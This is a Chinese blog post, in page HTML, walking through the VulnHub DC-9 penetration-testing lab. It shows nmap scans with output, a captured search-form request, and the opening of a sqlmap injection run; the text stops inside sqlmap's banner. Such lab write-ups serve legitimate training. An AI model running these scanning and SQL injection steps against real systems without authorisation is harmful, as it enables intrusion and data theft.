<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.0.2"><link rel="apple-touch-icon" sizes="180x180" href="/images/01.jpg"><link rel="icon" type="image/png" sizes="32x32" href="/images/01.jpg"><link rel="icon" type="image/png" sizes="16x16" href="/images/01.jpg"><link rel="mask-icon" href="/images/logo.svg" color="#222"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="google-site-verification" content="h6ecMlAUCMDTIJmEha3N3mJmMydid5XY8AbS767rKtM"><meta name="baidu-site-verification" content="T0YB7GSdOB"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><script class="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"lunamoore.github.io",root:"/",scheme:"Muse",version:"8.0.0-rc.5",exturl:!0,sidebar:{position:"left",display:"post",padding:18,offset:12},copycode:!0,bookmark:{enable:!1,color:"#222",save:"auto"},fancybox:!0,mediumzoom:!1,lazyload:!1,pangu:!1,comments:{style:"tabs",active:null,storage:!0,lazyload:!1,nav:null},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"fadeInDown",post_body:"fadeInDown",coll_header:"fadeInLeft",sidebar:"fadeInUp"}},prism:!1,path:"search.xml",localsearch:{enable:!0,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1}}</script><meta name="description" content="0x00.官网描述 DC-9 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. The ultimate goal of this challenge is to get root and to read the o"><meta property="og:type" content="article"><meta property="og:title" content="DC-9"><meta property="og:url" content="https://lunamoore.github.io/2020/09/02/DC-9/index.html"><meta property="og:site_name" content="Lluna&#39;s Pure land."><meta property="og:description" content="0x00.官网描述 DC-9 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. The ultimate goal of this challenge is to get root and to read the o"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://lunamoore.github.io/2020/09/02/DC-9/image-20200902144807899.png"><meta property="og:image" content="https://lunamoore.github.io/2020/09/02/DC-9/image-20200902144920353.png"><meta property="og:image" content="https://lunamoore.github.io/2020/09/02/DC-9/image-20200902144932737.png"><meta property="og:image" content="https://lunamoore.github.io/2020/09/02/DC-9/image-20200902145133305.png"><meta property="og:image" content="https://lunamoore.github.io/2020/09/02/DC-9/image-20200902151603443.png"><meta property="og:image" content="https://lunamoore.github.io/2020/09/02/DC-9/image-20200902154421208.png"><meta property="og:image" content="https://lunamoore.github.io/2020/09/02/DC-9/image-20200902154513168.png"><meta property="og:image" content="https://lunamoore.github.io/2020/09/02/DC-9/image-20200902154938542.png"><meta property="article:published_time" content="2020-09-02T09:10:59.000Z"><meta property="article:modified_time" content="2020-09-02T09:16:46.732Z"><meta property="article:author" content="Lluna"><meta property="article:tag" content="靶机"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://lunamoore.github.io/2020/09/02/DC-9/image-20200902144807899.png"><link rel="canonical" href="https://lunamoore.github.io/2020/09/02/DC-9/"><script class="page-configurations">CONFIG.page={sidebar:"",isHome:!1,isPost:!0,lang:"zh-CN"}</script><title>DC-9 | Lluna's Pure land.</title><noscript><style>body{margin-top:2rem}.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header,.use-motion .sidebar{visibility:visible}.use-motion .footer,.use-motion .header,.use-motion .site-brand-container .toggle{opacity:initial}.use-motion .custom-logo-image,.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line{transform:scaleX(1)}.search-pop-overlay,.sidebar-nav{display:none}.sidebar-panel{display:block}</style></noscript><link rel="alternate" href="/atom.xml" title="Lluna's Pure land." type="application/atom+xml"></head><body itemscope itemtype="http://schema.org/WebPage" class="use-motion"><div class="headband"></div><main class="main"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line"></span> <span class="toggle-line"></span> <span class="toggle-line"></span></div></div><div class="site-meta"><a href="/" class="brand" rel="start"><i class="logo-line"></i><h1 class="site-title">Lluna's Pure land.</h1><i class="logo-line"></i></a><p class="site-subtitle" itemprop="description">What is life like when singing to wine?</p></div><div class="site-nav-right"><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home // 首页 fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user // 关于 fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags // 标签 fa-fw"></i>标签<span class="badge">11</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th // 分类 fa-fw"></i>分类<span class="badge">15</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive // 归档 fa-fw"></i>归档<span class="badge">39</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar //日程表 fa-fw"></i>日程表</a></li><li class="menu-item menu-item-movies"><a href="/movies" rel="section"><i class="fa fa-film // 电影 fa-fw"></i>电影</a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索</a></li></ul></nav><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"><input autocomplete="off" autocapitalize="off" maxlength="80" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span></div><div class="search-result-container"><div class="no-result"><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></div><div class="toggle sidebar-toggle"><span class="toggle-line"></span> <span class="toggle-line"></span> <span class="toggle-line"></span></div><aside class="sidebar"><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class="sidebar-nav"><li class="sidebar-nav-toc">文章目录</li><li class="sidebar-nav-overview">站点概览</li></ul><section class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%AE%98%E7%BD%91%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">0x00.官网描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E8%80%81%E8%A7%84%E7%9F%A9nmap"><span class="nav-number">2.</span> <span class="nav-text">0x01.老规矩nmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E7%BB%A7%E7%BB%ADnmap%E6%89%AB%E6%8F%8F%E6%9C%8D%E5%8A%A1%E5%8F%8A%E7%AB%AF%E5%8F%A3"><span class="nav-number">3.</span> <span class="nav-text">0x02.继续nmap扫描服务及端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%8F%91%E7%8E%B080%E7%AB%AF%E5%8F%A3%EF%BC%8C%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE"><span class="nav-number">4.</span> <span class="nav-text">0x03.发现80端口，直接访问</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E6%8A%93%E5%8C%85%EF%BC%8C%E6%89%AB%E6%8F%8F%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-number">5.</span> <span class="nav-text">0x04.抓包，扫描注入点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E8%BF%99%E9%87%8C%E5%AF%B9%E6%90%9C%E7%B4%A2%E6%A1%86%E4%B8%8E%E7%99%BB%E5%85%A5%E6%A1%86%E8%BF%9B%E8%A1%8C%E4%BA%86%E6%8A%93%E5%8C%85"><span class="nav-number">5.1.</span> <span class="nav-text">1.这里对搜索框与登入框进行了抓包</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E7%BC%96%E8%BE%91%E6%96%87%E4%BB%B6"><span class="nav-number">5.2.</span> <span class="nav-text">2.编辑文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%89%AB%E6%8F%8F%E6%B3%A8%E5%85%A5%E7%82%B9%EF%BC%8C%E5%8F%91%E7%8E%B0search%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5"><span class="nav-number">5.3.</span> <span class="nav-text">3.扫描注入点，发现search存在注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%89%AB%E6%8F%8F%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%8C%E7%BB%93%E6%9E%9C%E4%B8%BAStaff"><span class="nav-number">5.4.</span> <span class="nav-text">4.扫描当前数据库，结果为Staff</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E7%88%86%E8%A1%A8%EF%BC%8CUsers"><span class="nav-number">5.5.</span> <span class="nav-text">5.爆表，Users</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E7%88%86%E5%AD%97%E6%AE%B5"><span class="nav-number">5.6.</span> <span class="nav-text">6.爆字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-%E7%88%86%E6%95%B0%E6%8D%AE"><span class="nav-number">5.7.</span> <span class="nav-text">7.爆数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="nav-number">5.8.</span> <span class="nav-text">8.其他用户信息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E7%88%86%E7%A0%B4"><span class="nav-number">6.</span> <span class="nav-text">0x05.爆破</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%A0%B4%E8%A7%A3admin%E5%AF%86%E7%A0%81%E4%B8%BAtransorbital1"><span class="nav-number">6.1.</span> <span class="nav-text">1.破解admin密码为transorbital1</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E7%99%BB%E5%85%A5web-application"><span class="nav-number">7.</span> <span class="nav-text">0x06.登入web application</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-%E7%88%86%E7%A0%B4ssh"><span class="nav-number">8.</span> <span class="nav-text">0x07.爆破ssh</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-%E5%86%8D%E6%AC%A1%E7%88%86%E7%A0%B4ssh"><span class="nav-number">9.</span> <span class="nav-text">0x08.再次爆破ssh</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-fredf%E7%99%BB%E5%85%A5"><span class="nav-number">10.</span> <span class="nav-text">0x09.fredf登入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x10-%E6%8F%90%E6%9D%83"><span class="nav-number">11.</span> <span class="nav-text">0x10.提权</span></a></li></ol></div></section><section class="site-overview-wrap sidebar-panel"><div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" alt="Lluna" src="/images/01.jpg"><p class="site-author-name" itemprop="name">Lluna</p><div class="site-description" itemprop="description">A primary school student in the field of Cyberspace Security!</div></div><div class="site-state-wrap animated"><nav class="site-state"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">39</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">15</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/"><span class="site-state-item-count">11</span> <span class="site-state-item-name">标签</span></a></div></nav></div><div class="links-of-author animated"><span class="links-of-author-item"><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x1bmFtb29yZQ==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;lunamoore"><i class="fab fa-github fa-fw"></i></span> </span><span class="links-of-author-item"><span class="exturl" data-url="bWFpbHRvOmppeWViYWxhYmFsYUAxMjYuY29t" title="E-Mail → mailto:jiyebalabala@126.com"><i class="fa fa-envelope fa-fw"></i></span></span></div><div class="cc-license animated" itemprop="license"><span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></span></div><div class="links-of-blogroll animated"><div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i> 友链</div><ul class="links-of-blogroll-list"><li class="links-of-blogroll-item"><span class="exturl" data-url="aHR0cHM6Ly92YWxlY2FzZWMuZ2l0aHViLmlv" title="https:&#x2F;&#x2F;valecasec.github.io">valecalida's house</span></li></ul></div></section></div></aside><div class="sidebar-dimmer"></div></header><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span>0%</span></div><div class="reading-progress-bar"></div><span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x1bmFtb29yZS8=" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin:130px 106px" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span><noscript><div class="noscript-warning">Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://lunamoore.github.io/2020/09/02/DC-9/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/01.jpg"><meta itemprop="name" content="Lluna"><meta itemprop="description" content="A primary school student in the field of Cyberspace Security!"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Lluna's Pure land."></span><header class="post-header"><h1 class="post-title" itemprop="name headline">DC-9</h1><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2020-09-02 17:10:59" itemprop="dateCreated datePublished" datetime="2020-09-02T17:10:59+08:00">2020-09-02</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-09-02 17:16:46" itemprop="dateModified" datetime="2020-09-02T17:16:46+08:00">2020-09-02</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/vulnhub/" itemprop="url" rel="index"><span itemprop="name">vulnhub</span></a> </span>， <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/vulnhub/DC/" itemprop="url" rel="index"><span itemprop="name">DC</span></a> </span></span><span id="/2020/09/02/DC-9/" class="post-meta-item leancloud_visitors" data-flag-title="DC-9" title="阅读次数"><span class="post-meta-item-icon"><i class="far fa-eye"></i> </span><span class="post-meta-item-text">阅读次数：</span> <span class="leancloud-visitors-count"></span> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2020/09/02/DC-9/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2020/09/02/DC-9/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>23k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>21 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h2 id="0x00-官网描述"><a href="#0x00-官网描述" class="headerlink" title="0x00.官网描述"></a>0x00.官网描述</h2><blockquote><p>DC-9 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p><p>The ultimate goal of this challenge is to get root and to read the one and only flag.</p><p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p><p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won’t give you the answer, instead, I’ll give you an idea about how to move forward.</p></blockquote><a id="more"></a><h2 id="0x01-老规矩nmap"><a href="#0x01-老规矩nmap" class="headerlink" title="0x01.老规矩nmap"></a>0x01.老规矩nmap</h2><p><code>可以发现1为网关，2为宿主机，6为kali，那么8就是我们的受害者</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># nmap -sP 192.168.1.0/24 -oN nmap.sP</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-02 02:16 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0026s latency).</span><br><span class="line">MAC Address: 68:D1:BA:1F:FD:48 (Shenzhen Youhua Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.2</span><br><span class="line">Host is up (0.00032s latency).</span><br><span class="line">MAC Address: 50:5B:C2:8C:BE:A5 (Liteon Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.8</span><br><span class="line">Host is up (0.00028s latency).</span><br><span class="line">MAC Address: 00:0C:29:D7:7C:A8 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.6</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 2.08 seconds</span><br><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x02-继续nmap扫描服务及端口"><a href="#0x02-继续nmap扫描服务及端口" class="headerlink" title="0x02.继续nmap扫描服务及端口"></a>0x02.继续nmap扫描服务及端口</h2><p><code>可以发现开放了22/80端口，发现ssh状态为filtered（过滤），推测安装了knockd</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># nmap -sC -sV -v 192.168.1.8 -oN nmap.demo</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-02 02:17 EDT</span><br><span class="line">NSE: Loaded 151 scripts <span class="keyword">for</span> scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Initiating ARP Ping Scan at 02:17</span><br><span class="line">Scanning 192.168.1.8 [1 port]</span><br><span class="line">Completed ARP Ping Scan at 02:17, 0.03s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 02:17</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 02:17, 0.03s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 02:17</span><br><span class="line">Scanning 192.168.1.8 [1000 ports]</span><br><span class="line">Discovered open port 80/tcp on 192.168.1.8</span><br><span class="line">Completed SYN Stealth Scan at 02:17, 0.06s elapsed (1000 total ports)</span><br><span class="line">Initiating Service scan at 02:17</span><br><span class="line">Scanning 1 service on 192.168.1.8</span><br><span class="line">Completed Service scan at 02:17, 6.25s elapsed (1 service on 1 host)</span><br><span class="line">NSE: Script scanning 192.168.1.8.</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.91s elapsed</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.8</span><br><span class="line">Host is up (0.00011s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE    SERVICE VERSION</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">80/tcp open     http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Example.com - Staff Details - Welcome</span><br><span class="line">MAC Address: 00:0C:29:D7:7C:A8 (VMware)</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 7.92 seconds</span><br><span class="line">           Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.064KB)</span><br><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x03-发现80端口，直接访问"><a href="#0x03-发现80端口，直接访问" class="headerlink" title="0x03.发现80端口，直接访问"></a>0x03.发现80端口，直接访问</h2><p><code>发现了一些用户，一个登入框，一个搜索框，就没有其他有用的信息了</code></p><img src="/2020/09/02/DC-9/image-20200902144807899.png"> <img src="/2020/09/02/DC-9/image-20200902144920353.png"> <img src="/2020/09/02/DC-9/image-20200902144932737.png"><h2 id="0x04-抓包，扫描注入点"><a href="#0x04-抓包，扫描注入点" class="headerlink" title="0x04.抓包，扫描注入点"></a>0x04.抓包，扫描注入点</h2><h3 id="1-这里对搜索框与登入框进行了抓包"><a href="#1-这里对搜索框与登入框进行了抓包" class="headerlink" title="1.这里对搜索框与登入框进行了抓包"></a>1.这里对搜索框与登入框进行了抓包</h3><img src="/2020/09/02/DC-9/image-20200902145133305.png"><h3 id="2-编辑文件"><a href="#2-编辑文件" class="headerlink" title="2.编辑文件"></a>2.编辑文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># cat demo.txt </span></span><br><span class="line">POST /results.php HTTP/1.1</span><br><span class="line">Host: 192.168.1.8</span><br><span class="line">Content-Length: 8</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36</span><br><span class="line">Origin: http://192.168.1.8</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.1.8/search.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: SESS6ea13d7ee6970decd87c6ae82c8909ff=6hCT-InqREqWsLqJQMvcblMzdjfBuTsTvOqLVecWfjs; PHPSESSID=pdng34438k3h323o5l59vk46k4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search=1</span><br><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># </span></span><br></pre></td></tr></table></figure><h3 id="3-扫描注入点，发现search存在注入"><a href="#3-扫描注入点，发现search存在注入" class="headerlink" title="3.扫描注入点，发现search存在注入"></a>3.扫描注入点，发现search存在注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># sqlmap -r demo.txt --dbs --batch</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[<span class="string">&quot;]_____ ___ ___  &#123;1.4.8#stable&#125;</span></span><br><span class="line"><span class="string">|_ -| . [,]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [)]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span 